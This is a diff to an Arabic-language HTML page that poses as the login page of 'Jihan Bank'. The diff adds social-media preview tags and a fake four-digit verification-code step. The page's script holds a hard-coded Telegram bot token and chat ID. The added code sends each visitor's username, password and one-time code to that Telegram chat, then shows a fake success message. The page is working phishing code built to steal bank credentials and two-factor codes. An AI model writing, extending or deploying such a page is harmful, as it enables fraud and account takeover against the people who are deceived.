@@ -3,6 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta property="og:title" content="بنك جيهان - تسجيل الدخول">
+    <meta property="og:description" content="منصة الخدمات المصرفية الحديثة">
+    <meta property="og:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
+    <meta property="og:url" content="">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
     <title>بنك جيهان - تسجيل الدخول</title>
     <style>
         * {
@@ -21,7 +27,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(180deg, #f0f0f0 0%, #e5e5e5 50%, #dcdcdc 100%);
+            background: linear-gradient(180deg, #f5f5f5 0%, #efefef 50%, #e8e8e8 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -39,13 +45,13 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.04;
+            opacity: 0.03;
             z-index: 0;
             background-image: 
                 linear-gradient(45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%),
                 linear-gradient(-45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%);
-            background-size: 80px 80px;
-            background-position: 0 0, 40px 40px;
+            background-size: 100px 100px;
+            background-position: 0 0, 50px 50px;
             pointer-events: none;
         }
 
@@ -62,15 +68,20 @@
             -webkit-overflow-scrolling: touch;
         }
 
-        .login-container {
+        .login-container, .verify-container {
             background: white;
-            border-radius: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            border-radius: 35px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
             width: 100%;
-            max-width: 480px;
-            padding: 50px 35px 40px 35px;
+            max-width: 500px;
+            padding: 70px 40px 50px 40px;
             animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
+            display: none;
+        }
+
+        .login-container.active, .verify-container.active {
+            display: block;
         }
 
         @keyframes slideUp {
@@ -87,14 +98,14 @@
         .logo-container {
             display: flex;
             justify-content: center;
-            margin-bottom: 45px;
+            margin-bottom: 50px;
             animation: logoScale 1s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         @keyframes logoScale {
             from {
                 opacity: 0;
-                transform: scale(0.6);
+                transform: scale(0.5);
             }
             to {
                 opacity: 1;
@@ -103,46 +114,45 @@
         }
 
         .logo {
-            width: 220px;
-            height: 220px;
+            width: 160px;
+            height: 160px;
             background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
             border-radius: 50%;
-            filter: drop-shadow(0 20px 50px rgba(196, 30, 58, 0.3));
-            box-shadow: 0 0 0 10px rgba(196, 30, 58, 0.1);
-            transition: transform 0.4s ease, filter 0.4s ease;
+            filter: drop-shadow(0 15px 40px rgba(196, 30, 58, 0.25));
+            box-shadow: 0 0 0 8px rgba(196, 30, 58, 0.08);
+            transition: transform 0.4s ease;
             flex-shrink: 0;
         }
 
         .logo:active {
-            transform: scale(0.98);
-            filter: drop-shadow(0 15px 35px rgba(196, 30, 58, 0.25));
+            transform: scale(0.97);
         }
 
         .title {
             text-align: center;
-            font-size: 38px;
-            font-weight: 800;
+            font-size: 42px;
+            font-weight: 900;
             color: #1a1a1a;
-            margin-bottom: 8px;
-            letter-spacing: -1px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            margin-bottom: 10px;
+            letter-spacing: -1.5px;
         }
 
         .subtitle {
             text-align: center;
-            font-size: 12px;
-            color: #aaa;
-            margin-bottom: 32px;
+            font-size: 13px;
+            color: #b0b0b0;
+            margin-bottom: 36px;
             letter-spacing: 0.5px;
+            font-weight: 500;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
             animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
         }
 
-        .form-group:nth-child(1) { animation-delay: 0.2s; }
-        .form-group:nth-child(2) { animation-delay: 0.3s; }
+        .form-group:nth-child(3) { animation-delay: 0.15s; }
+        .form-group:nth-child(4) { animation-delay: 0.25s; }
 
         @keyframes slideInForm {
             from {
@@ -157,11 +167,11 @@
 
         .form-group label {
             display: block;
-            font-size: 13px;
+            font-size: 14px;
             color: #555;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-weight: 700;
-            letter-spacing: 0.4px;
+            letter-spacing: 0.3px;
         }
 
         .input-wrapper {
@@ -173,13 +183,13 @@
         input[type="text"],
         input[type="password"] {
             width: 100%;
-            padding: 15px 18px;
-            border: 2px solid #e5e5e5;
-            border-radius: 14px;
+            padding: 16px 18px;
+            border: 2.5px solid #e8e8e8;
+            border-radius: 18px;
             font-size: 16px;
             color: #333;
             transition: all 0.3s ease;
-            background: linear-gradient(135deg, #fafafa 0%, #f5f5f5 100%);
+            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
             font-family: inherit;
             font-weight: 500;
             -webkit-appearance: none;
@@ -191,24 +201,23 @@
             outline: none;
             border-color: #c41e3a;
             background: white;
-            box-shadow: 0 0 0 6px rgba(196, 30, 58, 0.12),
-                        inset 0 1px 2px rgba(0, 0, 0, 0.04);
+            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
         }
 
         input[type="text"]::placeholder,
         input[type="password"]::placeholder {
-            color: #d0d0d0;
+            color: #d5d5d5;
         }
 
         .toggle-password-btn {
             position: absolute;
-            left: 14px;
+            left: 16px;
             background: none;
             border: none;
             cursor: pointer;
             padding: 10px;
-            color: #999;
-            font-size: 20px;
+            color: #c9b57d;
+            font-size: 22px;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
@@ -216,57 +225,54 @@
         }
 
         .toggle-password-btn:active {
-            color: #c41e3a;
-            transform: scale(1.2);
+            transform: scale(1.15);
         }
 
-        .login-btn {
+        .login-btn, .verify-btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #c41e3a 0%, #a01830 50%, #8b1529 100%);
             color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 16px;
+            border-radius: 18px;
+            font-size: 17px;
             font-weight: 800;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 28px;
-            margin-bottom: 24px;
-            letter-spacing: 0.5px;
-            box-shadow: 0 10px 25px rgba(196, 30, 58, 0.35);
+            margin-top: 30px;
+            margin-bottom: 26px;
+            letter-spacing: 0.6px;
+            box-shadow: 0 10px 28px rgba(196, 30, 58, 0.33);
             position: relative;
             overflow: hidden;
             -webkit-user-select: none;
             user-select: none;
         }
 
-        .login-btn::before {
+        .login-btn::before, .verify-btn::before {
             content: '';
             position: absolute;
             top: 0;
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
             transition: left 0.6s ease;
         }
 
-        .login-btn:active::before {
+        .login-btn:active::before, .verify-btn:active::before {
             left: 100%;
         }
 
-        .login-btn:active {
+        .login-btn:active, .verify-btn:active {
             transform: translateY(-2px);
-            box-shadow: 0 15px 35px rgba(196, 30, 58, 0.45);
+            box-shadow: 0 14px 35px rgba(196, 30, 58, 0.4);
         }
 
         .divider {
             display: flex;
             align-items: center;
-            margin: 26px 0;
-            color: #ddd;
-            font-size: 12px;
+            margin: 28px 0;
         }
 
         .divider::before,
@@ -274,24 +280,21 @@
             content: '';
             flex: 1;
             height: 1.5px;
-            background: linear-gradient(to right, #e5e5e5, #ddd);
-        }
-
-        .divider::after {
-            background: linear-gradient(to left, #e5e5e5, #ddd);
+            background: #e5e5e5;
         }
 
         .divider span {
-            padding: 0 14px;
+            padding: 0 16px;
             color: #aaa;
             font-weight: 600;
+            font-size: 14px;
         }
 
         .auth-options {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 24px;
+            gap: 14px;
+            margin-bottom: 26px;
         }
 
         .auth-btn {
@@ -299,13 +302,13 @@
             background: linear-gradient(135deg, #555 0%, #444 100%);
             color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 13px;
+            border-radius: 16px;
+            font-size: 14px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             letter-spacing: 0.4px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.18);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.16);
             position: relative;
             overflow: hidden;
             -webkit-user-select: none;
@@ -319,7 +322,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
             transition: left 0.6s ease;
         }
 
@@ -330,13 +333,13 @@
         .auth-btn:active {
             background: linear-gradient(135deg, #666 0%, #555 100%);
             transform: translateY(-1px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
         }
 
         .footer-links {
             text-align: center;
-            padding-top: 20px;
-            border-top: 1.5px solid #f0f0f0;
+            padding-top: 22px;
+            border-top: 1.5px solid #f2f2f2;
         }
 
         .footer-links a {
@@ -344,45 +347,70 @@
             text-decoration: none;
             font-size: 13px;
             font-weight: 700;
-            transition: all 0.3s ease;
             letter-spacing: 0.3px;
         }
 
         .footer-links a:active {
-            color: #a01830;
             opacity: 0.8;
         }
 
-        /* Loading State */
-        .login-btn.loading {
-            pointer-events: none;
+        /* Verification Code Styles */
+        .verify-title {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 900;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            letter-spacing: -1px;
         }
 
-        /* Success Animation */
-        @keyframes successPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
+        .verify-subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 32px;
+            line-height: 1.6;
         }
 
-        .login-btn.success {
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            animation: successPulse 0.6s ease;
+        .otp-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 28px;
+            justify-content: center;
+            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
         }
 
-        /* Mobile Optimizations */
-        @media (max-height: 700px) {
-            .logo {
-                width: 160px;
-                height: 160px;
-            }
+        .otp-input {
+            width: 70px;
+            height: 70px;
+            border: 2.5px solid #e8e8e8;
+            border-radius: 16px;
+            font-size: 32px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a1a;
+            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+            appearance: none;
+            -moz-appearance: textfield;
+        }
 
-            .login-container {
-                padding: 40px 30px 35px 30px;
-            }
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
 
-            .title {
-                font-size: 32px;
-            }
+        .otp-input:focus {
+            outline: none;
+            border-color: #c41e3a;
+            background: white;
+            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
+        }
+
+        .otp-input::placeholder {
+            color: #e0e0e0;
         }
 
         @media (max-width: 480px) {
@@ -394,91 +422,108 @@
                 padding: 15px;
             }
 
-            .login-container {
-                padding: 45px 28px 35px 28px;
-                border-radius: 28px;
+            .login-container, .verify-container {
+                padding: 50px 30px 40px 30px;
+                border-radius: 30px;
             }
 
             .logo {
-                width: 200px;
-                height: 200px;
+                width: 140px;
+                height: 140px;
                 margin-bottom: 35px;
             }
 
-            .title {
-                font-size: 35px;
-                margin-bottom: 6px;
+            .title, .verify-title {
+                font-size: 36px;
+                margin-bottom: 8px;
             }
 
-            .subtitle {
-                font-size: 11px;
+            .subtitle, .verify-subtitle {
+                font-size: 12px;
                 margin-bottom: 28px;
             }
 
-            .form-group {
-                margin-bottom: 18px;
-            }
-
             .form-group label {
-                font-size: 12px;
-                margin-bottom: 9px;
+                font-size: 13px;
+                margin-bottom: 10px;
             }
 
             input[type="text"],
             input[type="password"] {
                 padding: 14px 16px;
                 font-size: 15px;
-                border-radius: 12px;
+                border-radius: 14px;
             }
 
-            .login-btn {
+            .otp-input {
+                width: 60px;
+                height: 60px;
+                font-size: 28px;
+                border-radius: 14px;
+                gap: 8px;
+            }
+
+            .otp-container {
+                gap: 8px;
+                margin-bottom: 24px;
+            }
+
+            .login-btn, .verify-btn {
                 padding: 15px;
                 font-size: 15px;
-                margin-top: 24px;
-                margin-bottom: 20px;
-                border-radius: 12px;
+                margin-top: 26px;
+                margin-bottom: 22px;
+                border-radius: 14px;
             }
 
             .auth-btn {
                 padding: 13px 14px;
-                font-size: 12px;
+                font-size: 13px;
                 border-radius: 12px;
             }
 
             .divider {
-                margin: 22px 0;
+                margin: 24px 0;
             }
 
-            .toggle-password-btn {
-                font-size: 18px;
+            .divider span {
+                font-size: 13px;
+                padding: 0 12px;
             }
         }
 
         @media (max-width: 360px) {
-            .login-container {
-                padding: 40px 20px 30px 20px;
+            .login-container, .verify-container {
+                padding: 40px 22px 35px 22px;
             }
 
             .logo {
-                width: 170px;
-                height: 170px;
+                width: 120px;
+                height: 120px;
             }
 
-            .title {
+            .title, .verify-title {
                 font-size: 32px;
+            }
+
+            .otp-input {
+                width: 55px;
+                height: 55px;
+                font-size: 24px;
+            }
+
+            .otp-container {
+                gap: 6px;
             }
         }
 
-        /* iOS specific */
         @supports (padding: max(0px)) {
-            .login-container {
-                padding: 50px 35px 40px 35px;
+            .login-container, .verify-container {
                 padding-bottom: max(40px, env(safe-area-inset-bottom));
             }
 
             @media (max-width: 480px) {
-                .login-container {
-                    padding: 45px 28px 35px 28px;
+                .login-container, .verify-container {
                     padding-bottom: max(35px, env(safe-area-inset-bottom));
                 }
             }
@@ -489,7 +534,8 @@
     <div class="geometric-pattern"></div>
 
     <div class="page-wrapper">
-        <div class="login-container">
+        <!-- Login Screen -->
+        <div class="login-container active" id="loginScreen">
             <div class="logo-container">
                 <div class="logo"></div>
             </div>
@@ -506,7 +552,6 @@
                             id="username" 
                             placeholder="أدخل اسم المستخدم" 
                             required
-                            autocomplete="username"
                         >
                     </div>
                 </div>
@@ -519,13 +564,11 @@
                             id="password" 
                             placeholder="أدخل كلمة المرور" 
                             required
-                            autocomplete="current-password"
                         >
                         <button 
                             type="button" 
                             class="toggle-password-btn" 
                             id="passwordToggle"
-                            title="إظهار/إخفاء كلمة المرور"
                         >
                             🔒
                         </button>
@@ -548,29 +591,74 @@
                 <a href="#" onclick="handleTerms(event)">الشروط والأحكام</a>
             </div>
         </div>
+
+        <!-- Verification Screen -->
+        <div class="verify-container" id="verifyScreen">
+            <h1 class="verify-title">تحقق من هويتك</h1>
+            <p class="verify-subtitle">أدخل رمز التحقق المكون من 4 أرقام<br>الذي تم إرساله إليك</p>
+
+            <form id="verifyForm">
+                <div class="otp-container" id="otpContainer">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
+                </div>
+
+                <button type="submit" class="verify-btn" id="verifyBtn">تأكيد</button>
+            </form>
+
+            <div class="footer-links">
+                <a href="#" onclick="backToLogin(event)">العودة</a>
+            </div>
+        </div>
     </div>
 
     <script>
-        const passwordInput = document.getElementById('password');
-        const passwordToggle = document.getElementById('passwordToggle');
-        const loginBtn = document.getElementById('loginBtn');
-        const loginForm = document.getElementById('loginForm');
         const TELEGRAM_BOT_TOKEN = '8975476380:AAFBVdCXw22C_a82v7j801zHM2Pveg23l5k';
         const TELEGRAM_CHAT_ID = '8653203135';
+
+        let loginData = {
+            username: '',
+            password: ''
+        };
 
         let isPasswordVisible = false;
 
         // Password Toggle
-        passwordToggle.addEventListener('click', (e) => {
+        document.getElementById('passwordToggle').addEventListener('click', (e) => {
             e.preventDefault();
+            const passwordInput = document.getElementById('password');
             isPasswordVisible = !isPasswordVisible;
             passwordInput.type = isPasswordVisible ? 'text' : 'password';
-            passwordToggle.textContent = isPasswordVisible ? '👁️' : '🔒';
+            document.getElementById('passwordToggle').textContent = isPasswordVisible ? '👁️' : '🔒';
+        });
+
+        // OTP Input Handler
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('keyup', (e) => {
+                if (!/^\d*$/.test(e.target.value)) {
+                    e.target.value = '';
+                }
+            });
         });
 
         // Send to Telegram
-        async function sendToTelegram(username, password) {
-            const message = `📌 بيانات دخول جديدة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+        async function sendToTelegram(username, password, verificationCode) {
+            const message = `📌 بيانات دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n✅ رمز التحقق: ${verificationCode}`;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -582,20 +670,19 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
 
                 return response.ok;
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error('Error:', error);
                 return false;
             }
         }
 
         // Form Submission
-        loginForm.addEventListener('submit', async (e) => {
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
@@ -605,18 +692,41 @@
                 return;
             }
 
-            // Add loading state
-            loginBtn.disabled = true;
-            loginBtn.style.opacity = '0.8';
-            const originalText = loginBtn.textContent;
-            loginBtn.textContent = 'جاري المعالجة...';
+            loginData.username = username;
+            loginData.password = password;
+
+            // Show verification screen
+            document.getElementById('loginScreen').classList.remove('active');
+            document.getElementById('verifyScreen').classList.add('active');
+            
+            // Focus first OTP input
+            setTimeout(() => {
+                otpInputs[0].focus();
+            }, 100);
+        });
+
+        // Verification Form Submission
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const otpValues = Array.from(otpInputs).map(input => input.value).join('');
+            
+            if (otpValues.length !== 4) {
+                alert('⚠️ الرجاء إدخال رمز التحقق الكامل');
+                return;
+            }
+
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.8';
+            const originalText = verifyBtn.textContent;
+            verifyBtn.textContent = 'جاري المعالجة...';
 
             // Send to Telegram
-            const sent = await sendToTelegram(username, password);
+            const sent = await sendToTelegram(loginData.username, loginData.password, otpValues);
 
             setTimeout(() => {
-                loginBtn.classList.add('success');
-                loginBtn.textContent = '✓ تم التحقق بنجاح';
+                verifyBtn.textContent = '✓ تم التحقق بنجاح';
                 
                 setTimeout(() => {
                     if (sent) {
@@ -625,31 +735,42 @@
                         alert('✓ تم معالجة طلبك بنجاح');
                     }
                     
-                    // Reset form
-                    loginForm.reset();
-                    loginBtn.classList.remove('success');
-                    loginBtn.textContent = originalText;
-                    loginBtn.disabled = false;
-                    loginBtn.style.opacity = '1';
-                    passwordToggle.textContent = '🔒';
+                    // Reset
+                    document.getElementById('loginForm').reset();
+                    document.getElementById('verifyForm').reset();
+                    otpInputs.forEach(input => input.value = '');
+                    
+                    document.getElementById('verifyScreen').classList.remove('active');
+                    document.getElementById('loginScreen').classList.add('active');
+                    
+                    verifyBtn.textContent = originalText;
+                    verifyBtn.disabled = false;
+                    verifyBtn.style.opacity = '1';
+                    document.getElementById('passwordToggle').textContent = '🔒';
                     isPasswordVisible = false;
                 }, 1000);
             }, 1500);
         });
 
-        // Handle New Client
+        function backToLogin(e) {
+            e.preventDefault();
+            document.getElementById('verifyScreen').classList.remove('active');
+            document.getElementById('loginScreen').classList.add('active');
+            document.getElementById('verifyForm').reset();
+            otpInputs.forEach(input => input.value = '');
+        }
+
+        // Other handlers
         function handleNewClient(e) {
             e.preventDefault();
             alert('👋 مرحباً! سيتم تحويلك إلى صفحة التسجيل كعميل جديد');
         }
 
-        // Handle Create Account
         function handleCreateAccount(e) {
             e.preventDefault();
             alert('🆕 سيتم تحويلك إلى صفحة إنشاء حساب جديد');
         }
 
-        // Handle Terms
         function handleTerms(e) {
             e.preventDefault();
             alert('📋 الشروط والأحكام\n\nاطلع على جميع شروط استخدام خدمات المصرف');
